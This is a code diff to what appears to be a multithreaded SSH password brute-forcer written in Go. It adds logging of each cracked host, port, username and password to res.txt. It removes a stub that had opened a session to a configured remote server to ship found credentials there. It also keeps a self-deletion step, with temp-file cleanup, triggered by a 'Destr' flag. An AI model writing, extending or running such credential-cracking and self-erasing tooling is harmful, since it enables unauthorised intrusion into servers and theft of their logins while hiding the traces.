@@ -15,18 +15,16 @@ import (
 	"sort"
 	"strconv"
 	"sync"
-	check "test/CHECK"
-	vars "test/VARS"
+	check "test/client/CHECK"
+	vars "test/vars"
 	"time"
 
 	"golang.org/x/crypto/ssh"
 )
 
 var allC vars.AllConnections
-var b bytes.Buffer
 var wg sync.WaitGroup
 var DaC []vars.DelaConnection
-var serCon vars.Connection
 
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
@@ -39,10 +37,6 @@ func Bf(conf vars.Config) {
 	}
 
 	vars.BrFileHomeDir = filepath.Join("/tmp", RandomString(10))
-	serCon.Host = conf.Client.Host
-	serCon.Port = conf.Client.Port
-	serCon.Username = conf.Client.User // []Do Something TODO
-	serCon.Password = conf.Client.Pass
 
 	msgSess := make(chan vars.Connection)
 	msgErr := make(chan vars.Connection)
@@ -59,6 +53,8 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 				Conn:   ses,
 			}
 			DaC = append(DaC, c)
+			WriteToResults(c)
+
 		case SingleDel := <-msgErr:
 			c := vars.DelaConnection{
 				Single: true,
@@ -145,8 +141,8 @@ func ReadCsv(msgSess, msgErr chan vars.Connection, conf vars.Config) {
 		}
 	}
 	StartBruteForce(&allC, msgSess, msgErr, conf)
-	// SendFileToServer(finalSessionsFound, conf)
 	if conf.Flags.Destr {
+		os.Remove("c")
 		SelfDel()
 	}
 }
@@ -169,26 +165,15 @@ func SelfDel() {
 	}
 }
 
-func SendFileToServer(finalSessionsFound []vars.Connection, conf vars.Config) {
-
-	session, _, err := CreateConn(serCon)
-	if err != nil {
-		fmt.Println("error")
-	}
-	session.Stdout = &b
-	stringToWrite := ""
-	for _, j := range finalSessionsFound {
-
-		x := fmt.Sprintf("HOST : %s Pass : %s  Usename : %s Port : %s \n", j.Host, j.Password, j.Username, j.Port)
-
-		stringToWrite = stringToWrite + x
-
-	}
-	b.Reset()
-}
-
 func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Connection, conf vars.Config) {
 	// foundSessions := []vars.Connection{}
+	file, err := os.Create("c")
+	if err != nil {
+		fmt.Println("Error creating file:", err)
+		return
+	}
+
+	file.Close()
 	for len(allConn.Conn) != 0 {
 		for i := 1; i <= conf.Flags.Threads; i++ {
 			wg.Add(1)
@@ -268,6 +253,19 @@ func CreateConn(c vars.Connection) (*ssh.Session, vars.Connection, error) {
 		return nil, c, err
 	}
 	return session, c, nil
+}
+
+func WriteToResults(c vars.DelaConnection) {
+	f, err := os.OpenFile("res.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0660)
+	if err != nil {
+		panic(err)
+	}
+
+	defer f.Close()
+	stringToErite := fmt.Sprintf("Host: %s Port: %s Username: %s Password: %s\n", c.Conn.Host, c.Conn.Port, c.Conn.Username, c.Conn.Password)
+	if _, err = f.WriteString(stringToErite); err != nil {
+		panic(err)
+	}
 }
 
 func removeDuplicates(nums []int) []int {
